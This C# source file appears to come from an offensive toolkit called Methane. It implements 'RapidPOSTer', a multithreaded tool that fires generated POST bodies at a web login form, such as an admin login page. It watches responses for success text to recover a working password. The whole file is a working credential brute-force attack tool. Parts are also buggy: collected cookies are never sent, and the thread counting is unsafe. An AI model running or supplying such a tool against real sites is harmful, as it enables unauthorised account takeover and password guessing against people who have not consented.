using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using static Methane.Toolkit.Common;

namespace Methane.Toolkit
{
    public class RapidPOSTer
    {


        public string findWith;
        public bool hasFindWith;
        public bool hasFindWithout;
        public string findWithout;
        public string url;

        public bool found;
        public string foundPass;
        public int runningThrds;
        public int AllowedThrds;

        public CSA csa;
        IEnumerator<string> bodyPipeline;

        public bool HasCookie = false;
        public string Cookie;

        public void PromptParamenters()
        {
            found = false;
            runningThrds = 0;

            Log("---------------------------------");
            Log("|           Methane             |");
            Log("|     Rapid HTTP Request        |");
            Log("|           POSTer              |");
            Log("---------------------------------");

            url = Prompt("Enter Request URL (Ex :- http://DamnWebSite.com/admin/userlogin.php ) : ");

            ChooseCookies:
            Cookie = Prompt("Enter cookies to use OR Enter ~filename to read cookies OR [Enter] not to use cookies");

            HasCookie = Cookie != "";
            if (Cookie.StartsWith('~'))
            {
                if (Cookie == "~") Cookie = "~cookie.txt";
                try
                {
                    Cookie = File.ReadAllText(Cookie.TrimStart('~'));
                }
                catch (Exception ex)
                {
                    LogError(ex);
                    goto ChooseCookies;
                }
            }


            findWith = Prompt("In a positive response, what text we would find? (Ex :- Wellcome) [or null]");
            hasFindWith = findWith != "";
            findWithout = Prompt("In a positive response, what text we won't find? (Ex :- Wrong password) [or null]");
            hasFindWithout = findWithout != "";

            Prompt("Please use the following tool to create POST body data string list");
            csa = new CSA();
            csa.PromptParamenters();


            PromtHowManyThreads:
            if (!int.TryParse(Prompt("How many threads to use?"), out AllowedThrds)) goto PromtHowManyThreads;

            Log("Rapid POSTer standby    :-) ");

        }



        public string Run()
        {


            Log("Rapid POSTer Running...");


            bodyPipeline = csa.RunIterator();

            for (int n = 0; n < AllowedThrds; n++)
            {
                new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(ThrLoop)) { Name = $"POST Thrd {n}" }.Start(null);
                System.Threading.Thread.Sleep(10);
            }


            while (runningThrds != 0)
            {
                System.Threading.Thread.Sleep(100);
            }

            if (found)
            {
                Prompt($"We found it!!! '{foundPass}'     ________");
            }
            else
            {
                Prompt("I can't find it  :-(              ________");
            }

            return foundPass;
        }




        private void ThrLoop(object o)
        {

            runningThrds++;



            bodyPipelineMoveNext:

            if (found) { runningThrds--; return; }

            if (bodyPipeline.MoveNext())
            {
                string poststring = bodyPipeline.Current;

                try
                {

                    string resp = PostForm(url, poststring);

                    if ((hasFindWith && resp.Contains(findWith)) || (hasFindWithout && !resp.Contains(findWithout)))
                    {
                        Log($"We found it! '{poststring}' _______ :-) ________________________________");
                        found = true;
                        foundPass = poststring;

                        runningThrds--; return;
                    }
                    else
                    {
                        Log($"{poststring} didn't work");
                    }

                }
                catch (Exception ex)
                {
                    Log($"!!! Error {ex.ToString()} - {ex.Message} @ {ex.StackTrace}");
                }

                goto bodyPipelineMoveNext;
            }


            runningThrds--;

        }


        public static string PostForm(string url, string poststring, string Cookie = "", string Headers = "")
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "POST";
            wr.ContentType = "application/x-www-form-urlencoded";

            if (Cookie != "") wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);

            if (Headers != "")
                foreach (string header in Headers.Split("/n"))
                    wr.Headers.Add(Headers);



            byte[] bytedata = System.Text.Encoding.UTF8.GetBytes(poststring);
            wr.ContentLength = bytedata.Length;

            // Create the stream
            Stream requestStream = wr.GetRequestStream();
            requestStream.Write(bytedata, 0, bytedata.Length);
            requestStream.Close();

            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            string resp = sb.ToString();
            return resp;
        }
    }
}
